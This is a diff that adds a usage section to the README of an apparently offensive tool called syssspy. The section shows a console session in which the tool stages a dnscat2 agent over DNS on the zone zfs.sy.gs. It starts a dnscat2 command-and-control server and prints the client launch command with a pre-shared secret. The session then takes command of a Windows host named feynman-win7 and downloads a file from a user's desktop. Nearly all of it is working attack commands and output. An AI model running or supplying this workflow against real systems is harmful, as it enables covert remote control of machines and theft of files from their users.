@@ -218,3 +218,68 @@ syssspy session> exit
 Do you really want to exit the session and close the connection [y/N]? y
 syssspy> exit
 ```
+
+Or maybe we want to use dnscat2 for the real deal and just use syssspy to stage it:
+
+```
+$ syssspy
+syssspy> set TRANSPORT DNS
+syssspy> set AGENTTYPE DNSCAT2
+syssspy> set ZONE zfs.sy.gs
+syssspy> run
+[+] DNS listening on 0.0.0.0:53
+[+] Sending staged agent (406569 bytes)...
+100% (2185 of 2185) |##########################################################| Elapsed Time: 0:01:17 Time: 0:01:17
+[+] Staging done
+[+] Starting dnscat2 to handle the real connection
+
+New window created: 0
+New window created: crypto-debug
+Welcome to dnscat2! Some documentation may be out of date.
+
+auto_attach => false
+history_size (for new windows) => 1000
+Security policy changed: All connections must be encrypted and authenticated
+New window created: dns1
+Starting Dnscat2 DNS server on 0.0.0.0:53
+[domains = zfs.sy.gs]...
+
+Assuming you have an authoritative DNS server, you can run
+the client anywhere with the following (--secret is optional):
+
+  ./dnscat --secret=muzynL9ofNW+vymbGMLmi1W1QOT7jEJNYcCRZ1wy5fzTf1Y3epy1RuO7BcHJcIsBvGsZW9NvmQBUSVmUXMCaTg== zfs.sy.gs
+
+To talk directly to the server without a domain name, run:
+
+  ./dnscat --dns server=x.x.x.x,port=53 --secret=muzynL9ofNW+vymbGMLmi1W1QOT7jEJNYcCRZ1wy5fzTf1Y3epy1RuO7BcHJcIsBvGsZW9NvmQBUSVmUXMCaTg==
+
+Of course, you have to figure out <server> yourself! Clients
+will connect directly on UDP port 53.
+
+dnscat2> New window created: 1
+Session 1 Security: ENCRYPTED AND VERIFIED!
+(the security depends on the strength of your pre-shared secret!)
+
+dnscat2> sessions
+0 :: main [active]
+  crypto-debug :: Debug window for crypto stuff [*]
+  dns1 :: DNS Driver running on 0.0.0.0:53 domains = zfs.sy.gs [*]
+  1 :: command (feynman-win7) [encrypted and verified] [*]
+  
+dnscat2> session -i 1
+New window created: 1
+history_size (session) => 1000
+Session 1 Security: ENCRYPTED AND VERIFIED!
+(the security depends on the strength of your pre-shared secret!)
+This is a command session!
+
+That means you can enter a dnscat2 command such as
+'ping'! For a full list of clients, try 'help'.
+
+command (feynman-win7) 1> download c:/Users/fsteglich/Desktop/testfile.txt /tmp/out.txt
+Attempting to download c:/Users/fsteglich/Desktop/testfile.txt to /tmp/out.txt
+Wrote 3295 bytes from c:/Users/fsteglich/Desktop/testfile.txt to /tmp/out.txt!
+
+command (feynman-win7) 1> exit
+Input thread is over
+```
